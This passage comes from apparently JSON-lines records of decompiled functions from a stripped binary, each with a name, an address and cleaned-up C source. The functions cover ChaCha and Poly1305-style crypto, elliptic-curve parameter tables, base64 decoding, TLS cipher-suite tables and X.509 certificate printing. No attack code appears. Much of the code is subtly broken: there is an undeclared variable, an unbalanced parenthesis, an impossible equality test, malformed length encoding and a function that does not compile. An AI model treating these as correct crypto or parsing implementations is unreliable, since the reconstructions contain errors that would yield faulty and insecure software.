(loop_control != 0); \n    \n    for (loop_counter = 0; loop_counter < 0x40; loop_counter += 4) {\n        *(uint *)((long)&data_holder + loop_counter) = 0x61707865 + result_array[loop_counter / 4]; \n    }\n    \n    for (result_value_1 = 0; result_value_1 < 0x20; result_value_1 += 4) {\n        intermediate_value_12 = *(undefined4 *)((long)&data_holder + result_value_1); \n        *output_param++ = (char)intermediate_value_12; \n        output_param[1] = (char)((uint)intermediate_value_12 >> 8); \n        output_param[3] = (char)((uint)intermediate_value_12 >> 0x18); \n        output_param[2] = (char)((uint)intermediate_value_12 >> 0x10); \n        output_param += 4; \n    }\n}"}
{"Function Name": "FUN_004257e0", "Address": "004257e0", "Source Code": "int FUN_004257e0(long input_address, undefined8 data_reference, uint data_size, undefined8 source_data, uint buffer_size, undefined8 initial_data, long additional_data) {\n    int return_value = -1; \n    undefined data_buffer[152]; \n    if (buffer_size < 0x21) { \n        *(undefined4 *)(input_address + 0x30) = 1; \n        if (data_size != 0) { \n            FUN_00404f70(input_address, data_reference, additional_data, data_size); \n        }\n        FUN_00424f20(data_buffer, initial_data); \n        FUN_00425390(data_buffer, source_data, buffer_size); \n        if ((buffer_size & 0xf) != 0) { \n            FUN_00425390(data_buffer, &DAT_006698d0, (long)(int)(0x10 - (buffer_size & 0xf))); \n        }\n        FUN_00425390(data_buffer, additional_data, (ulong)data_size); \n        if ((data_size & 0xf) != 0) { \n            FUN_00425390(data_buffer, &DAT_006698d0, (long)(int)(0x10 - (data_size & 0xf))); \n        }\n        \n        \n        data_buffer[0] = (undefined)buffer_size; \n        data_buffer[1] = (undefined)(data_size >> 8); \n        data_buffer[2] = 0; \n        data_buffer[3] = 0; \n        data_buffer[4] = (undefined)(data_size >> 0x10); \n        data_buffer[5] = 0; \n        data_buffer[6] = (undefined)(data_size >> 0x18); \n        data_buffer[7] = (char)data_size; \n        FUN_00425390(data_buffer, data_buffer, 0x10); \n        FUN_004250f0(data_buffer, additional_data + (ulong)data_size); \n        return_value = data_size + 0x10; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00425940", "Address": "00425940", "Source Code": "void FUN_00425940(undefined4 *dataArray)\n{\n    \n    dataArray[0x10] = *dataArray;\n    \n    *(undefined8 *)(dataArray + 0x12) = *(undefined8 *)(dataArray + 2);\n    \n    *(undefined8 *)(dataArray + 0x14) = *(undefined8 *)(dataArray + 4);\n    \n    *(undefined8 *)(dataArray + 0x16) = *(undefined8 *)(dataArray + 8);\n    \n    *(undefined8 *)(dataArray + 0x18) = *(undefined8 *)(dataArray + 0xe);\n    \n    *(undefined8 *)(dataArray + 0x1a) = *(undefined8 *)(dataArray + 10);\n    \n    *(undefined8 *)(dataArray + 0x1c) = *(undefined8 *)(dataArray + 0xc);\n}"}
{"Function Name": "FUN_00425980", "Address": "00425980", "Source Code": "void FUN_00425980(void)\n{\n    \n    secp192r1_curve_params = DAT_00649500;\n    \n    \n    secp192r1_curve_point = PTR_s_secp192r1_00649508;\n    \n    \n    secp192r1_curve_order = PTR_s_64210519E59C80E70FA7E9AB72243049_00649520;\n    \n    \n    secp192r1_base_point_x = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE_00649510;\n    \n    \n    secp192r1_base_point_y = PTR_s_188DA80EB03090F67CBF20EB43A18800_00649528;\n    \n    \n    _DAT_00649570 = PTR_s_07192B95FFC8DA78631011ED6B24CDD5_00649530;\n    \n    \n    secp192r1_cofactor = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFF99DEF836_00649538;\n    \n    \n    secp224r1_curve_params = DAT_00649480;\n    \n    \n    secp224r1_curve_point = PTR_s_secp224r1_00649488;\n    \n    \n    secp224r1_curve_order = PTR_s_B4050A850C04B3ABF54132565044B0B7_006494a0;\n    \n    \n    secp224r1_base_point_x = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_00649490;\n    \n    \n    secp224r1_base_point_y = PTR_s_B70E0CBD6BB4BF7F321390B94A03C1D3_006494a8;\n    \n    \n    _DAT_006494f0 = PTR_s_BD376388B5F723FB4C22DFE6CD4375A0_006494b0;\n    \n    \n    secp224r1_cofactor = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFF16A2_006494b8;\n    \n    \n    secp224k1_curve_params = DAT_00649400;\n    \n    \n    secp224k1_curve_point = PTR_s_secp224k1_00649408;\n    \n    \n    secp224k1_curve_order = PTR_s_00000000000000000000000000000000_00649420;\n    \n    \n    secp224k1_base_point_x = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_00649410;\n    \n    \n    secp224k1_base_point_y = PTR_s_A1455B334DF099DF30FC28A169A467E9_00649428;\n    \n    \n    _DAT_00649470 = PTR_s_7E089FED7FBA344282CAFBD6F7E319F7_00649430;\n    \n    \n    secp224k1_cofactor = PTR_s_0000000000000000000000000001DCE8_00649438;\n    \n    \n    secp256r1_curve_params = DAT_00649380;\n    \n    \n    secp256r1_curve_point = PTR_s_secp256r1_00649388;\n    \n    \n    secp256r1_curve_order = PTR_s_5AC635D8AA3A93E7B3EBBD55769886BC_006493a0;\n    \n    \n    secp256r1_base_point_x = PTR_s_FFFFFFFF000000010000000000000000_00649390;\n    \n    \n    secp256r1_base_point_y = PTR_s_6B17D1F2E12C4247F8BCE6E563A440F2_006493a8;\n    \n    \n    _DAT_006493f0 = PTR_s_4FE342E2FE1A7F9B8EE7EB4A7C0F9E16_006493b0;\n    \n    \n    secp256r1_cofactor = PTR_s_FFFFFFFF00000000FFFFFFFFFFFFFFFF_006493b8;\n    \n    \n    secp256k1_curve_params = DAT_00649300;\n    \n    \n    secp256k1_curve_point = PTR_s_secp256k1_00649308;\n    \n    \n    secp256k1_curve_order = PTR_s_00000000000000000000000000000000_00649320;\n    \n    \n    secp256k1_base_point_x = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_00649310;\n    \n    \n    secp256k1_base_point_y = PTR_s_79BE667EF9DCBBAC55A06295CE870B07_00649328;\n    \n    \n    _DAT_00649370 = PTR_s_483ADA7726A3C4655DA4FBFC0E1108A8_00649330;\n    \n    \n    secp256k1_cofactor = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE_00649338;\n    \n    \n    secp384r1_curve_params = DAT_00649280;\n    \n    \n    secp384r1_curve_point = PTR_s_secp384r1_00649288;\n    \n    \n    secp384r1_curve_order = PTR_s_B3312FA7E23EE7E4988E056BE3F82D19_006492a0;\n    \n    \n    secp384r1_base_point_x = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_00649290;\n    \n    \n    secp384r1_base_point_y = PTR_s_AA87CA22BE8B05378EB1C71EF320AD74_006492a8;\n    \n    \n    _DAT_006492f0 = PTR_s_3617DE4A96262C6F5D9E98BF9292DC29_006492b0;\n    \n    \n    secp384r1_cofactor = PTR_s_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_006492b8;\n    \n    \n    secp521r1_curve_params = DAT_00649200;\n    \n    \n    secp521r1_curve_point = PTR_s_secp521r1_00649208;\n    \n    \n    secp521r1_curve_order = PTR_s_0051953EB9618E1C9A1F929A21A0B685_00649220;\n    \n    \n    secp521r1_base_point_x = PTR_s_01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_00649210;\n    \n    \n    secp521r1_base_point_y = PTR_s_00C6858E06B70404E9CD9E3ECB662395_00649228;\n    \n    \n    _DAT_00649270 = PTR_s_011839296A789A3BC0045C8A5FB42C7D_00649230;\n    \n    \n    secp521r1_cofactor = PTR_s_01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFF_00649238;\n}"}
{"Function Name": "FUN_00425c30", "Address": "00425c30", "Source Code": "void FUN_00425c30(char *input_bytes, byte *output_bytes)\n{\n    \n    \n    output_bytes[0] = (byte)input_bytes[1] >> 4 | *input_bytes << 2;\n    \n    \n    output_bytes[1] = (byte)input_bytes[2] >> 2 | input_bytes[1] << 4;\n    \n    \n    output_bytes[2] = input_bytes[2] << 6 | input_bytes[3];\n}"}
{"Function Name": "FUN_00425c70", "Address": "00425c70", "Source Code": "long FUN_00425c70(byte *input_data, int data_length, byte *output_data)\n{\n    byte current_byte; \n    char transformed_char; \n    byte *end_pointer = input_data + data_length; \n    byte *output_pointer = output_data; \n    int processed_count = 0; \n    char transformed_buffer[16]; \n    do {\n        \n        if (end_pointer < input_data) {\n            return (long)output_pointer - (long)output_data; \n        }\n        do {\n            current_byte = *input_data++; \n            \n            if (((0x4f < (byte)(current_byte - 0x2b)) ||\n                (transformed_char = \"|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\\\]^_`abcdefghijklmnopq\"\n                [(int)(current_byte - 0x2b)], transformed_char == '\\0')) || (transformed_char == '$')) break; \n            if (end_pointer < input_data) break; \n            if (transformed_char != '=') { \n                transformed_buffer[processed_count++] = transformed_char + -0x3e; \n            }\n        } while (input_data <= end_pointer); \n    } while (true); \n    if (processed_count != 0) { \n        byte output_buffer[3]; \n        output_buffer[1] = transformed_buffer[1] << 4 | (byte)transformed_buffer[2] >> 2; \n        output_buffer[2] = transformed_buffer[2] << 6 | transformed_buffer[3]; \n        if (processed_count != 1) { \n            *output_pointer = (byte)transformed_buffer[1] >> 4 | transformed_buffer[0] << 2; \n            for (long index = 1; index < processed_count - 1; index++) { \n                output_pointer[index] = output_buffer[index]; \n            }\n            output_pointer += (ulong)(processed_count - 2) + 1; \n        }\n    }\n}"}
{"Function Name": "FUN_00425dd0", "Address": "00425dd0", "Source Code": "int FUN_00425dd0(long input_param_1, long input_param_2, long input_param_3, ulong *output_param)\n{\n    int return_value; \n    ulong retrieved_value; \n    \n    if (input_param_1 == 0 || input_param_2 == 0 || input_param_3 == 0 || output_param == (ulong *)0x0) {\n        return -1; \n    }\n    \n    return_value = (*DAT_00669910)(&local_30);\n    \n    if (return_value == 0) {\n        \n        return_value = (*DAT_00669a40)(*(undefined8 *)(input_param_2 + 0x10), *(undefined8 *)(input_param_1 + 8),\n                                *(undefined8 *)(input_param_1 + 0x18), local_30);\n        \n        if (return_value != 0) {\n            \n            (*DAT_00669920)(local_30);\n            return return_value; \n        }\n        \n        retrieved_value = (*DAT_00669990)();\n        \n        if (*output_param < retrieved_value) {\n            \n            (*DAT_00669920)(local_30);\n            return 6; \n        }\n        \n        return_value = (*DAT_00669998)(local_30, input_param_3);\n        \n        if (return_value == 0) {\n            *output_param = retrieved_value; \n        }\n        \n        (*DAT_00669920)(local_30);\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00425f00", "Address": "00425f00", "Source Code": "int FUN_00425f00(long input_value, size_t expected_size, void *input_pointer, size_t comparison_size, undefined4 *output_flag, long memory_address)\n{\n    undefined8 retrieved_value; \n    int function_result_1;       \n    int function_result_2;       \n    size_t allocated_size;   \n    void *allocated_memory;     \n    void *second_memory;      \n    size_t actual_size; \n    \n    if (input_pointer != (void *)0x0 && input_value != 0 && output_flag != (undefined4 *)0x0 && memory_address != 0 && expected_size != 0 && comparison_size != 0) {\n        retrieved_value = *(undefined8 *)(memory_address + 0x18); \n        *output_flag = 0; \n        function_result_1 = (*DAT_00669968)(retrieved_value); \n        allocated_size = (*DAT_00669990)(*(undefined8 *)(memory_address + 0x18)); \n        \n        \n        if (allocated_size == expected_size && (allocated_memory = malloc(allocated_size), allocated_memory != (void *)0x0)) {\n            function_result_2 = (*DAT_00669a80)(input_value, allocated_size, allocated_memory, &actual_size, 0, memory_address); \n            if (function_result_2 == 0) { \n                \n                if (allocated_size != actual_size) {\n                    free(allocated_memory); \n                    return 7; \n                }\n                second_memory = malloc(allocated_size); \n                if (second_memory == (void *)0x0) { \n                    free(allocated_memory); \n                    return -1; \n                }\n                int comparison_result = 0; \n                function_result_2 = FUN_0041f630(allocated_memory, allocated_size, 1, (long)function_result_1, second_memory, &actual_size, &comparison_result); \n                \n                if (comparison_result != 0 && actual_size == comparison_size && (function_result_1 = memcmp(second_memory, input_pointer, comparison_size), function_result_1 == 0)) {\n                    *output_flag = 1; \n                }\n                free(allocated_memory); \n                free(second_memory); \n            } else {\n                free(allocated_memory); \n            }\n            return function_result_2; \n        }\n    }\n    return -1; \n}"}
{"Function Name": "FUN_004260b0", "Address": "004260b0", "Source Code": "undefined8 FUN_004260b0(long input_param_1, undefined8 input_param_2, long input_param_3, ulong *output_param_4, long input_param_5)\n{\n    int function_result; \n    undefined8 return_value; \n    ulong local_value; \n    \n    if (input_param_1 != 0 && input_param_3 != 0 && output_param_4 != (ulong *)0x0 && input_param_5 != 0) {\n        \n        function_result = (*DAT_00669968)(*(undefined8 *)(input_param_5 + 0x18));\n        \n        local_value = (*DAT_00669990)(*(undefined8 *)(input_param_5 + 0x18));\n        \n        \n        if (*output_param_4 < local_value) {\n            \n            *output_param_4 = local_value;\n            return_value = 6; \n        } else {\n            \n            return_value = FUN_00405aa0(input_param_1, input_param_2, 1, (long)function_result, 0, 0, input_param_3, &local_value);\n            \n            if ((int)return_value == 0) {\n                \n                return_value = (*DAT_00669a80)(input_param_3, local_value, input_param_3, output_param_4, 1, input_param_5);\n            }\n        }\n        return return_value; \n    }\n    return 0xffffffff; \n}"}
{"Function Name": "FUN_004261a0", "Address": "004261a0", "Source Code": "int FUN_004261a0(undefined8 input_param_1, int input_param_2, char *input_string, int input_length, undefined4 *output_array,\nundefined8 additional_param)\n{\n    int return_value; \n    long calculated_length; \n    undefined8 temp_values[2]; \n    \n    if ((output_array == (undefined4 *)0x0) || (DAT_00669900 == 0)) {\n        return 0xd; \n    }\n    *output_array = 1; \n    \n    return_value = FUN_0041ae70(output_array + 4, output_array + 6, output_array + 8, output_array + 10, 0);\n    if (return_value != 0) {\n        return 0xd; \n    }\n    calculated_length = -1; \n    \n    if (input_length != 0) {\n        \n        if (*input_string == '\\0') {\n            input_string = input_string + 1; \n            calculated_length = (long)(input_length + -2 >> 1); \n        } else {\n            calculated_length = (long)(input_length + -1 >> 1); \n        }\n    }\n    \n    return_value = (*DAT_006699a0)(*(undefined8 *)(output_array + 4), input_string + 1, calculated_length);\n    \n    if (((return_value != 0) ||\n        (return_value = (*DAT_006699a0)(*(undefined8 *)(output_array + 6), input_string + calculated_length + 1, calculated_length), return_value != 0)) ||\n        (return_value = (*DAT_006699a0)(*(undefined8 *)(output_array + 10), input_param_1, (long)input_param_2), return_value != 0))\n        )\n        goto LAB_00426310; \n    output_array[1] = 0xffffffff; \n    *(undefined8 *)(output_array + 2) = additional_param; \n    \n    return_value = (*DAT_00669938)(*(undefined8 *)(output_array + 8), 1);\n    \n    if ((return_value != 0) || (return_value = FUN_0041ae70(&temp_values[0], &temp_values[1], &temp_values[1], temp_values, 0), return_value != 0))\n        goto LAB_00426310; \n    \n    return_value = (*DAT_00669980)(temp_values[0], *(undefined8 *)(*(long *)(output_array + 2) + 0x10), 0x10);\n    \n    if (((return_value == 0) &&\n        ((return_value = (*DAT_00669980)(temp_values[1], *(undefined8 *)(*(long *)(output_array + 2) + 0x18), 0x10),\n        return_value == 0 && (return_value = (*DAT_006699d8)(*(undefined8 *)(output_array + 6), temp_values[1]), return_value == 0))))\n        &&\n        ((return_value = (*DAT_006699d8)(*(undefined8 *)(output_array + 4), temp_values[0]), return_value == 0 &&\n        ((((return_value = (*DAT_006699e0)(temp_values[0], temp_values[0], 0, temp_values[0]), return_value == 0 &&\n        (return_value = (*DAT_006699c8)(*(undefined8 *)(output_array + 4), temp_values[0], temp_values[0]),\n        return_value == 0)) && (return_value = (*DAT_006699b8)(temp_values[1], temp_values[0], temp_values[1]), return_value == 0))\n        && ((return_value = (*DAT_006699a8)(temp_values[1], *(undefined8 *)(output_array + 4), temp_values[1]), return_value == 0\n        && (return_value = (*DAT_006699a8)(temp_values[1], *(undefined8 *)(output_array + 4), temp_values[1]),\n        return_value == 0)))) &&\n        (return_value = (*DAT_006699a8)(temp_values[1], *(undefined8 *)(output_array + 4), temp_values[1]), return_value == 0))))))\n    {\n        \n        return_value = (*DAT_006699e0)(temp_values[1], temp_values[0], 0, temp_values[1]);\n        \n        while (return_value == 0) {\n            return_value = (*DAT_00669960)(temp_values[1], 0); \n            if (return_value != -1) goto LAB_00426488; \n            return_value = (*DAT_006699a8)(temp_values[1], temp_values[0], temp_values[1]); \n        }\n    }\n    goto LAB_004262f0; \n    \n    while (return_value = (*DAT_006699b8)(temp_values[1], temp_values[0], temp_values[1]), return_value == 0) {\n    LAB_00426488:\n        return_value = (*DAT_00669958)(temp_values[1], temp_values[0]); \n        if (return_value == -1) { \n            return_value = (*DAT_00669958)(temp_values[1], temp_values[1]); \n            if (return_value == 0) { \n                FUN_0041aff0(temp_values[0], temp_values[1], temp_values[1], temp_values[0], 0); \n                return 0; \n            }\n            return_value = 7; \n            break; \n        }\n    }\nLAB_004262f0:\n    FUN_0041aff0(temp_values[0], temp_values[1], temp_values[1], temp_values[0], 0); \nLAB_00426310:\n    FUN_0041aff0(*(undefined8 *)(output_array + 4), *(undefined8 *)(output_array + 6),\n    *(undefined8 *)(output_array + 8), *(undefined8 *)(output_array + 10), 0); \n    return return_value; \n}"}
{"Function Name": "FUN_00426500", "Address": "00426500", "Source Code": "void FUN_00426500(uint microseconds)\n{\n    timespec sleep_time; \n    sleep_time.tv_sec = microseconds / 1000000; \n    sleep_time.tv_nsec = (microseconds - (int)sleep_time.tv_sec * 1000000) * 1000; \n    nanosleep(&sleep_time, NULL); \n}"}
{"Function Name": "FUN_00426780", "Address": "00426780", "Source Code": "undefined8 FUN_00426780(long memoryAddress)\n{\n    \n    ushort ushortValue = *(ushort *)(memoryAddress + 0x62);\n    \n    \n    if (0x1303 < ushortValue) {\n        \n        if (ushortValue != 0xc027) {\n            \n            if (ushortValue < 0xc028) {\n                \n                if (ushortValue != 0xc013 && ushortValue != 0xc009 && ushortValue != 0xc00a) {\n                    return 0; \n                }\n                return 0x20; \n            } else if (ushortValue != 0xc023) {\n                \n                if (ushortValue == 0xc024) {\n                    return 0x20; \n                }\n                \n                return (ushortValue == 0xc014) ? 0x20 : 0;\n            }\n        } else if (ushortValue != 0xc02f) {\n            \n            if (ushortValue < 0xc030) {\n                \n                if (ushortValue == 0xc02b) {\n                    return 0x10;\n                }\n                \n                if (ushortValue == 0xc02c) {\n                    return 0x20;\n                }\n            } else {\n                \n                if (ushortValue == 0xc030 || (ushort)(ushortValue + 0x3358) < 3) {\n                    return 0x20; \n                }\n            }\n            return 0; \n        }\n    }\n    \n    \n    if (0x1301 < ushortValue) {\n        return 0x20; \n    }\n    \n    if (ushortValue == 0x67 || ushortValue == 0x2f || ushortValue == 0x33 || ushortValue == 0x3c) {\n        return 0x10; \n    }\n    \n    if (ushortValue < 0x68) {\n        \n        if (ushortValue != 0x35 && ushortValue != 0x3d && ushortValue != 0x39) {\n            return 0; \n        }\n        return 0x20; \n    } else if (ushortValue != 0x9d) {\n        \n        if (ushortValue < 0x9e) {\n            \n            if (ushortValue == 0x6b || ushortValue == 0x9c) {\n                return 0x20;\n            }\n            return 0; \n        }\n        \n        if (ushortValue == 0x9f || ushortValue == 0x1301) {\n            return 0x20;\n        }\n        return 0x10; \n    }\n    return 0x20; \n}"}
{"Function Name": "FUN_004268b0", "Address": "004268b0", "Source Code": "undefined8 FUN_004268b0(long input_address) \n{\n    ushort ushort_value; \n    ushort_value = *(ushort *)(input_address + 0x62); \n    if (ushort_value < 0xc02d) { \n        if (0xc02a < ushort_value) { \n            return 1; \n        }\n        if (ushort_value < 0x1303) { \n            if (0x1300 < ushort_value || (ushort)(ushort_value - 0x9c) < 4) { \n                return 1; \n            }\n        } else if (ushort_value == 0x1303) { \n            return 2; \n        }\n    } else if (ushort_value < 0xc031) { \n        if (0xc02e < ushort_value) { \n            return 1; \n        }\n    } else if ((ushort)(ushort_value + 0x3358) < 3) { \n        return 2; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00426920", "Address": "00426920", "Source Code": "undefined8 FUN_00426920(long memoryAddress)\n{\n    \n    ushort ushortValue = *(ushort *)(memoryAddress + 0x62);\n    \n    \n    if (ushortValue < 0xc00b) {\n        \n        if (0xc008 < ushortValue) {\n            return 0x14; \n        }\n        \n        if (ushortValue < 0x3e) {\n            \n            if (ushortValue < 0x3c) {\n                \n                if (ushortValue == 0x33 || (ushortValue == 0x34 && ushortValue == 0x2f)) {\n                    return 0x14; \n                }\n                if (ushortValue == 0x35 || ushortValue == 0x39) {\n                    return 0x14; \n                }\n                return 0; \n            }\n        } else if (ushortValue != 0x9c) {\n            \n            if (ushortValue < 0x9d) {\n                \n                if (ushortValue == 0x67 || ushortValue == 0x6b) {\n                    return 0; \n                }\n            } else if (ushortValue != 0x9e) {\n                \n                if (ushortValue == 0x9f) {\n                    return 0x30; \n                }\n                return 0x30; \n            }\n        }\n    } else if (ushortValue != 0xc02b) {\n        \n        if (ushortValue < 0xc02c) {\n            \n            if (ushortValue < 0xc024) {\n                \n                if (1 < (ushort)(ushortValue + 0x3fed)) {\n                    return 0; \n                }\n                return 0x14; \n            }\n            \n            if (ushortValue == 0xc027) {\n                return 0x20; \n            }\n            return 0x30; \n        } else {\n            \n            if (ushortValue == 0xc030) {\n                return 0x30; \n            }\n            \n            if (ushortValue < 0xc031) {\n                \n                if (ushortValue == 0xc02c) {\n                    return 0x30; \n                }\n                if (ushortValue != 0xc02f) {\n                    return 0; \n                }\n            } else if (2 < (ushort)(ushortValue + 0x3358)) {\n                return 0; \n            }\n        }\n    }\n    return 0x20; \n}"}
{"Function Name": "FUN_00426dd0", "Address": "00426dd0", "Source Code": "void * FUN_00426dd0(long input_pointer, uint input_length, int segment_count, int *output_result)\n{\n    char current_char; \n    int processing_result; \n    void *allocated_memory; \n    ulong segment_start_index = 0; \n    ulong current_index = 0; \n    *output_result = 0; \n    allocated_memory = malloc((long)(int)((input_length >> 2) * 3)); \n    if (allocated_memory != (void *)0x0) { \n        if (input_length != 0) { \n            do {\n                current_char = *(char *)(input_pointer + current_index); \n                if (current_char == '\\r' || current_char == '\\n') { \n                    current_index++; \n                } else if (current_char != '-') { \n                    if (current_index < input_length) { \n                        do {\n                            current_index++; \n                        } while (current_index < input_length && *(char *)(input_pointer + current_index) != '\\n'); \n                    }\n                }\n                if (segment_start_index == 0) { \n                    segment_start_index = current_index + 1; \n                } else {\n                    if (segment_count < 1) { \n                        processing_result = FUN_00425c70(input_pointer + segment_start_index, current_index - segment_start_index, allocated_memory); \n                        *output_result = processing_result; \n                        if (processing_result != 0) { \n                            return allocated_memory; \n                        }\n                        break; \n                    }\n                    segment_count--; \n                }\n            } while (current_index < input_length); \n        }\n        free(allocated_memory); \n    }\n    return (void *)0x0; \n}"}
{"Function Name": "FUN_00426ed0", "Address": "00426ed0", "Source Code": "undefined8 FUN_00426ed0(char *first_string, char *second_string, int max_comparisons)\n{\n    ulong index = 0; \n    if ((*first_string == '\\0') || (max_comparisons < 1)) { \n        return 1; \n    }\n    if (*first_string == *second_string) { \n        do {\n            if (first_string[index + 1] == '\\0' || index == max_comparisons - 1) { \n                return 1; \n            }\n            index++; \n        } while (first_string[index] == second_string[index]); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00426f20", "Address": "00426f20", "Source Code": "undefined8 FUN_00426f20(char *string1, char *string2, int max_compare, int limit)\n{\n    ulong match_count = 0; \n    if (limit < max_compare) { \n        max_compare = limit; \n    }\n    if (max_compare < 1) { \n        return 1; \n    }\n    if (*string1 == *string2) { \n        do {\n            if (match_count == max_compare - 1) { \n                return 1; \n            }\n            match_count++; \n        } while (string1[match_count] == string2[match_count]); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00426f70", "Address": "00426f70", "Source Code": "undefined8 * FUN_00426f70(void)\n{\n    undefined8 *memoryPointer; \n    long loopCounter; \n    memoryPointer = (undefined8 *)malloc(0x100); \n    if (memoryPointer != (undefined8 *)0x0) { \n        for (loopCounter = 0x20; loopCounter != 0; loopCounter--) { \n            *memoryPointer = 0; \n            memoryPointer++; \n        }\n    }\n    return memoryPointer; \n}"}
{"Function Name": "FUN_004270b0", "Address": "004270b0", "Source Code": "int FUN_004270b0(long inputPointer, undefined8 additionalParam)\n{\n    ushort ushortValue; \n    long longValue;   \n    int functionResult;    \n    int defaultReturnValue = 0x2e; \n    if (inputPointer != 0) { \n        functionResult = FUN_00426fa0(*(undefined8 *)(inputPointer + 0x98)); \n        if (functionResult != 0) { \n            longValue = *(long *)(inputPointer + 0xa0); \n            if (longValue != 0 && (ushortValue = *(ushort *)(inputPointer + 0xa8), ushortValue != 0)) { \n                for (long index = 0; index < (ulong)(ushortValue * 8); index += 8) { \n                    functionResult = FUN_00426fa0(*(undefined8 *)(longValue + index), additionalParam); \n                    if (functionResult == 0) { \n                        return 0; \n                    }\n                }\n            }\n            return functionResult; \n        }\n    }\n    return defaultReturnValue; \n}"}
{"Function Name": "FUN_00427150", "Address": "00427150", "Source Code": "uint FUN_00427150(long input_param)\n{\n    uint status_code = 0x2e; \n    time_t current_time; \n    char formatted_time[16]; \n    \n    if (input_param != 0 && *(long *)(input_param + 0x68) != 0 && *(long *)(input_param + 0x70) != 0) {\n        current_time = time((time_t *)0x0); \n        tm *time_info = gmtime(&current_time); \n        \n        if (time_info != (tm *)0x0) {\n            formatted_time[0] = '\\0'; \n            \n            snprintf(formatted_time, 0x10, \"%04d%02d%02d%02d%02d%02dZ\", \n                     (ulong)(time_info->tm_year + 0x76c), \n                     (ulong)(time_info->tm_mon + 1), \n                     (ulong)(uint)time_info->tm_mday, \n                     time_info->tm_hour, \n                     time_info->tm_min, \n                     time_info->tm_sec); \n            \n            if (strcasecmp(*(char **)(input_param + 0x68), formatted_time) < 1) {\n                \n                status_code = strcasecmp(*(char **)(input_param + 0x70), formatted_time) >> 0x1f & 0x2d; \n            }\n        }\n    }\n    return status_code; \n}"}
{"Function Name": "FUN_00427310", "Address": "00427310", "Source Code": "void FUN_00427310(long input_value, char *char_pointer, uint flag_value)\n{\n    \n    if ((*char_pointer == '\\0') && ((flag_value & 1) != 0)) {\n        \n        char_pointer++;\n        \n        flag_value--;\n    }\n    \n    FUN_00427230(input_value + 0x20, char_pointer, flag_value);\n    \n    if (*(long *)(input_value + 0x20) != 0) {\n        \n        *(uint *)(input_value + 0x28) = flag_value;\n    }\n}"}
{"Function Name": "FUN_00427360", "Address": "00427360", "Source Code": "void FUN_00427360(long base_address, undefined8 data_value, undefined4 value_to_store)\n{\n    \n    FUN_00427230(base_address + 0x30);\n    \n    \n    if (*(long *)(base_address + 0x30) != 0) {\n        \n        *(undefined4 *)(base_address + 0x38) = value_to_store;\n    }\n}"}
{"Function Name": "FUN_00427390", "Address": "00427390", "Source Code": "void FUN_00427390(long input_value, char *char_pointer, uint count)\n{\n    \n    if ((*char_pointer == '\\0') && ((count & 1) != 0)) {\n        \n        char_pointer++;\n        \n        count--;\n    }\n    \n    FUN_00427230(input_value + 200, char_pointer, count);\n    \n    if (*(long *)(input_value + 200) != 0) {\n        \n        *(uint *)(input_value + 0xd0) = count;\n    }\n}"}
{"Function Name": "FUN_004273e0", "Address": "004273e0", "Source Code": "char * FUN_004273e0(ushort *asn1_data,char *output_buffer,int buffer_size)\n{\n    int bytes_written; \n    int bytes_written_current; \n    ulong loop_index; \n    size_t remaining_buffer_size; \n    char *current_output_position; \n    uint loop_index_increment; \n    if (output_buffer != (char *)0x0) { \n        *output_buffer = '\\0'; \n        if (*asn1_data == 0) { \n            if ((*(long *)(asn1_data + 0x18) == 0) || (*(int *)(asn1_data + 0x1c) == 0)) { \n                snprintf(output_buffer,(long)buffer_size,\"Empty ASN1 file\"); \n            } else {\n                bytes_written = snprintf(output_buffer,(long)buffer_size,\"X.509 private key\\n  Private Key: \"); \n                if ((0 < bytes_written) && (*(int *)(asn1_data + 0x1c) != 0)) { \n                    loop_index = 0; \n                    do {\n                        loop_index_increment = (int)loop_index + 1; \n                        bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"%02x\", \n                                         (ulong)*(byte *)(*(long *)(asn1_data + 0x18) + loop_index));\n                        bytes_written += bytes_written_current; \n                        loop_index = (ulong)loop_index_increment; \n                    } while (loop_index_increment < *(uint *)(asn1_data + 0x1c)); \n                }\n            }\n        } else {\n            bytes_written = snprintf(output_buffer,(long)buffer_size, \n                             \"X.509v%i certificate\\n  Issued by: [%s]%s (%s)\\n  Issued to: [%s]%s (%s, %s)\\n  Subject: %s\\n  Validity: %s - %s\\n  OCSP: %s\\n  Serial number: \",\n                             (ulong)*asn1_data, *(undefined8 *)(asn1_data + 0x20),\n                             *(undefined8 *)(asn1_data + 0x2c), *(undefined8 *)(asn1_data + 0x30),\n                             *(undefined8 *)(asn1_data + 0x3c), *(undefined8 *)(asn1_data + 0x48),\n                             *(undefined8 *)(asn1_data + 0x40), *(undefined8 *)(asn1_data + 0x44),\n                             *(undefined8 *)(asn1_data + 0x4c), *(undefined8 *)(asn1_data + 0x34),\n                             *(undefined8 *)(asn1_data + 0x38), *(undefined8 *)(asn1_data + 0x58));\n            if ((0 < bytes_written) && (*(int *)(asn1_data + 0x60) != 0)) { \n                loop_index = 0; \n                do {\n                    loop_index_increment = (int)loop_index + 1; \n                    bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"%02x\", \n                                     (ulong)*(byte *)(*(long *)(asn1_data + 0x5c) + loop_index));\n                    bytes_written += bytes_written_current; \n                    loop_index = (ulong)loop_index_increment; \n                } while (loop_index_increment < *(uint *)(asn1_data + 0x60)); \n            }\n            if ((*(long *)(asn1_data + 0x50) != 0) && (asn1_data[0x54] != 0)) { \n                bytes_written_current = snprintf(output_buffer + bytes_written,(long)(buffer_size - bytes_written),\"\\n  Alternative subjects: \"); \n                bytes_written += 